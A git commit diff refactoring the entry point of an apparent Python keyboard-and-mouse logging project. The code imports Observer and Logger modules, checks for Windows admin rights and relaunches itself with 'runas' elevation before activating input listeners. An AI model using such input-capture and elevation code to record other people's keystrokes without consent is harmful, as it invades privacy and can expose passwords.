7f82e3c332a7419af1951551a15e88e5e2661d40
V-Perotto <vittorio.perotto@outlook.com>
2023-08-04 11:33:00 -0300

    Especificando import; refatorando classe Main e adicionando Logger para Main

--- app/Files/Main.py
+++ app/Files/Main.py
@@ -1,36 +1,37 @@
-import multiprocessing
-from Loggers.KeyLogger import KeyLogger
-from Loggers.MouseLogger import MouseLogger
-from Loggers.Observer import Observer
+from ctypes import windll
+from sys import executable, argv
+from traceback import format_exc
+from Settings.config import keyboard_mouse
 from Loggers.Logger import Logger
-import ctypes, sys
-import traceback
+from Loggers.Observer import Observer
 
 
-class Main():
+class Main:
+    
+    def __init__(self):
+        self.logger = Logger(keyboard_mouse)
     
     def __is_admin(self):
         try:
-            return ctypes.windll.shell32.IsUserAnAdmin()
+            return windll.shell32.IsUserAnAdmin()
         except:
             return False
 
-    def __run_with_admin(self, observer, logger):
+    def __run_with_admin(self, observer):
         if self.__is_admin():
             try:
                 observer.activate_listeners()
             except:
-                logger.error(traceback.format_exc()) 
+                self.logger.error(format_exc()) 
         else:
             # Re-run the program with admin rights
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+            windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv), None, 1)
         
     def run(self, use_admin=False):
         observer = Observer()
-        logger = Logger("")
         
         if use_admin:
-            self.__run_with_admin(observer, logger)
+            self.__run_with_admin(observer)
         else:
             observer.activate_listeners() 
         
